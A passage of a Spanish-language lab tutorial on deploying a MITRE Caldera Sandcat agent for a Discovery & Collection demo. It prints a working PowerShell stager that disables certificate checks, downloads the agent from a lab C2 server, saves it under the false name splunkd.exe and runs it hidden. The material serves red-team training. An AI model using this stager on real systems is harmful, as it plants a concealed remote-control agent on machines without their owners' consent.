# Configuración

Al loguearnos a la interfaz web, deberíamos acceder directamente al dashboard y obtener algo como lo siguiente

![Caldera Dashboard](../img/caldera4.png)

Por cuestiones de tiempo y practicidad, nos limitaremos a ejecutar un "Discovery & Collection". Es inofensivo pero muestra perfectamente cómo Caldera "piensa" y cómo el agente reporta en tiempo real. Para el lado agente (lo que corre del lado de la "víctima", desde el dashboard: Campaigns -> Agent -> Deploy an Agent. Deberíamos ver algo como lo siguiente:

Foto: caldera6.png

Seleccionaremos "Sendcat" y colocaremos la URL de nuestro server en el primer campo, y dejaremos los otros dos en default. Caldera generará código a ejecutar en el Windows (en el se arbitran los medios, entre otras cosas, para descargar el agente.

foto: caldera7.png

El código generado y adaptado a nuestro certificado autofirmado resulta:

`# 1. AGREGADO: Bypass de SSL para que PowerShell confíe en el cert autofirmado
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};

$server="https://192.168.1.54:8443";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);

# Limpieza de procesos previos (por si re-lanzas la demo)
get-process | ? {$_.path -like "*splunkd.exe*"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;

# Escribir el binario en disco
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;

# 2. AJUSTE: Se agregó el flag "-insecure" para que el agente confíe en el C2
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red -insecure -v" -WindowStyle hidden;`
